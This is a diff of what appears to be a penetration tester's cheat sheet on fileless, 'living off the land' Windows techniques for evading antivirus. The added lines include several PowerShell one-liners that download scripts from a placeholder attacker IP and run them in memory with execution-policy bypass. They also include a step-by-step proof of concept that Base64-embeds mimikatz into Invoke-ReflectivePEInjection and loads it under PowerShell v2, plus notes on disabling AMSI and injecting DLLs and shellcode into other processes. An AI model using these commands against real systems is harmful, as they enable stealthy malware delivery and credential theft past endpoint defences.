@@ -32,9 +32,9 @@ V.   Examples of techniques to bypass AV products and to download and execute st
 I. Reminder & Definitions
 ================================================================================================================================================
 
----------------------------------------------------------------
-Why using 'living off the land and fileless' techniques ?
----------------------------------------------------------------
+-----------------------------------------------------------------
+1.1 Why using 'living off the land and fileless' techniques ?
+-----------------------------------------------------------------
 > The purpose of the 'living off the land and fileless' techniques is to avoid getting detected and blocked by the antivirus and end-point protection
   solutions installed on modern Windows machines during penetration tests by:
   - running scripts, portable executable files and shellcodes directly into memory  
@@ -53,9 +53,9 @@ Why using 'living off the land and fileless' techniques ?
   on a modern Windows machine it is recommended to disable the Antimalware Scan Interface (AMSI) to avoid our script, shellcode or PE file being scanned and potentially 
   blocked by the AV installed on the Windows machine.
 
----------------------------------------------------------------
-Microsoft Antimalware Scan Interface (AMSI)
----------------------------------------------------------------
+-----------------------------------------------------------------
+1.2 Microsoft Antimalware Scan Interface (AMSI)
+-----------------------------------------------------------------
 > The Microsoft Antimalware Scan Interface (AMSI) provides enhanced malware protection by allowing the Antivirus solution installed on a modern Windows machine
   (i.e. Windows 10/11 or Windows server 2016/2019) to scan the applications and scripts before they are executed. 
   
@@ -91,9 +91,9 @@ Microsoft Antimalware Scan Interface (AMSI)
   - https://amsi.fail
   - https://cheatsheet.haax.fr/windows-systems/privilege-escalation/amsi_and_evasion/
   
----------------------------------------------------------------
-Windows Security features and Microsoft security products
----------------------------------------------------------------
+-----------------------------------------------------------------
+1.3 Windows Security features and Microsoft security products
+-----------------------------------------------------------------
 > PowerShell security features
   Microsoft has added some security features in PowerShell v5 to help out the Blue teams such as: 
   - Constrained Language Mode
@@ -161,34 +161,30 @@ Windows Security features and Microsoft security products
 II.  Examples of "living off the land" techniques using PowerShell (i.e. download and execute straight into memory PE, DLL and PoSh scripts) 
 ================================================================================================================================================
 
-PowerShell is built on .NET and there are several methods to load straight into memory .Net Assemblies (PE and DLL) such as : 
-> Add assembly with Add-Type cmdletPermalink
-> Add assembly with Reflection Assembly
-> Add assembly via a string objectPermalink
-  + Step 1 - Get Base64 encoded string
-  + Step 2 - Embed assembly string in script
-    $dll = 'TVqQAAMAAAAEAAAA//8AALgAAAAA...'
-    $bytes = [System.Convert]::FromBase64String($dll)
-    [System.Reflection.Assembly]::Load($bytes)
+PowerShell is built on .NET and it natively allows to download and execute straight into memory:
+> PowerShell scripts
+> .Net Assemblies (PE and DLL)
+  Examples
+   > Method 1 - Add assembly with Add-Type cmdletPermalink
+   > Method 2 - Add assembly with Reflection Assembly
+   > Method 3 - Add assembly via a string objectPermalink
 
+In addition, with PowerShell, we can also download and execute straight into memory any Windows PE and DLL by using the reflective PE/DLL injection methods.
 
-Examples of PowerShell scripts that can be used to load remote .NET assemblies (PE and DLL) and shellcodes straight into memory
---------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------
+2.1. Examples of PowerShell scripts and commands that can be used to load remote (.NET) PE and DLL straight into memory
+-----------------------------------------------------------------------------------------------------------------------------------------------
 
 => PowerSharpPack is a tool with many useful offensive CSharp Projects (mostly PEs) wraped into one PowerShell script that can be remotely loaded into memory for easy usage.
    + https://github.com/S3cur3Th1sSh1t/PowerSharpPack
    
 => The PowerShell script 'PowerLoader.ps1' builds script block which safely loads into-memory remote PowerShell script, .NET assemblies, and shellcodes.
    + https://github.com/tmenochet/PowerExec/blob/master/PowerLoader.ps1
-   
-=> The PowerSploit frameworks - Old ( Invoke-ReflectivePEInjection.ps1, Invoke-DllInjection.ps1, Invoke-Shellcode.ps1)
-   + https://github.com/PowerShellMafia/PowerSploit/CodeExecution/
-   
+
 
 In addtion, below are some examples of PowerShell commands that allow to manually download and inject straight into memory remote .Net Assemblies (PE and DLL)
 and PowerShell scripts.
 Keep in mind that to avoid AV detection it will necessary to bypass the AMSI (Refer to the next section).
-
 
 Examples - "Manually" Download and execute a .Net PE straight into memory using PowerShell
 -------------------------------------------------------------------------------------------
@@ -230,14 +226,96 @@ PS C:\temp> [System.Reflection.Assembly]::Load($bytes)
 Example - "Manually"Download and execute a scripts straight into memory using PowerShell
 -----------------------------------------------------------------------------------------
 
- PS C:\temp> powershell -exec bypass
- PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://YOUR_IP_ADDRESS/Your-PowerShell-Script.ps1'); Your-PowerShell-script-function-name
+PS C:\temp> powershell -exec bypass
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://YOUR_IP_ADDRESS/Your-PowerShell-Script.ps1'); Your-PowerShell-script-function-name
+- OR -
+PS C:\temp> powershell -exec bypass
+PS C:\temp> $payload = 'http://Your-IP-address/PowerShell-Script.ps1'
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString($payload);
+- OR -
+C:\temp> echo IEX(New-Object Net.WebClient).DownloadString('http://Your-IP-address/PowerShell-Script.ps1') | powershell -noprofile - 
+- OR -
+C:\temp> powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://Your-IP-address/PowerShell-Script.ps1')|iex"
 
- OR
- 
- PS C:\temp> powershell -exec bypass
- PS C:\temp> $payload = 'http://Your-IP-address/PowerShell-Script.ps1'
- PS C:\temp> IEX (New-Object Net.WebClient).DownloadString($payload);
+
+--------------------------------------------------------------------------------------------------------------------------------------------------
+2.2. Examples of PowerShell scripts that can be used to load any Windows PE, DLL and shellcode straight into memory
+--------------------------------------------------------------------------------------------------------------------------------------------------
+
+OLD - The PowerSploit frameworks (https://github.com/PowerShellMafia/PowerSploit/CodeExecution/)
+
+> Invoke-ReflectivePEInjection.ps1
+  This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, or it can reflectively load a DLL in to a remote process.
+  
+> Invoke-DllInjection.ps1
+  This script injects a Dll into an arbitrary process. It does this by using VirtualAllocEx to allocate memory the size of the DLL in the remote process,
+  writing the names of the DLL to load into the remote process spacing using WriteProcessMemory, and then using RtlCreateUserThread to invoke LoadLibraryA 
+  in the context of the remote process.
+
+> Invoke-Shellcode.ps1
+  Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.
+
+
+PoC with Mimkatz.exe and Invoke-ReflectivePEInjection.ps1
+-----------------------------------------------------------
+
+Step 1 - Encode in Base64 the Windows PE 'Mimikatz.exe'
+- - -  - - - - - - - - - - - - - - - - - - - - - - - - -
+PS C:\temp> $SourceFile = "C:\temp\mimikatz.exe"
+PS C:\temp> $Base64File = "C:\temp\mimi-encoded.txt"
+PS C:\temp> [IO.File]::WriteAllBytes($Base64File,[char[]][Convert]::ToBase64String([IO.File]::ReadAllBytes($SourceFile)))
+PS C:\temp> ls
+    Directory: C:\temp
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        29/12/2022     04:11        1807020 mimi-encoded.txt
+-a----        19/09/2022     17:44        1355264 mimikatz.exe
+
+
+Step 2 - Add the following lines at the end of the script 'Invoke-ReflectivePEInjection.ps1' and rename it to 'Invoke-ReflectivePEInjection-Custom.ps1'
+- - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Function Execute-Mimi-with-ReflectivePEInjection {
+$InputString = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAA.....  //content of 'mimi-encoded.txt'
+$PEBytes = [System.Convert]::FromBase64String($InputString)
+Invoke-ReflectivePEInjection -PEBytes $PEBytes
+}
+PS C:\temp> ls
+    Directory: C:\temp
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a---         29/12/2022     04:33        1942980 Invoke-ReflectivePEInjection-Custom.ps1
+-a---         29/12/2022     04:11        1807020 mimi-encoded.txt
+-a---         19/09/2022     17:44        1355264 mimikatz.exe
+
+
+Step 3 - Load the Mimikatz 'reflectively' from memory using'Invoke-ReflectivePEInjection-Custom.ps1'
+- - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+PS C:\temp> 
+PS C:\temp> powershell -version 2
+Windows PowerShell
+Copyright (C) 2009 Microsoft Corporation. All rights reserved.
+
+PS C:\temp> . .\Invoke-ReflectivePEInjection-Custom.ps1
+PS C:\temp> Execute-Mimi-with-ReflectivePEInjection
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # 
+mimikatz # coffee
+
+    ( (
+     ) )
+  .______.
+  |      |]
+  \      /
+   `----'
+
+mimikatz #
 
 
 ================================================================================================================================================
@@ -248,7 +326,6 @@ The goal of the 'LOLBAS' project is to document every binary, script, and librar
 
 => https://lolbas-project.github.io/#remote
 => https://github.com/LOLBAS-Project/LOLBAS#criteria
-
 
 --------------------------------------------------------------------------------------------
 Example of LOLBAS n°1 - Rundll32.exe (Used by Windows to execute dll files)
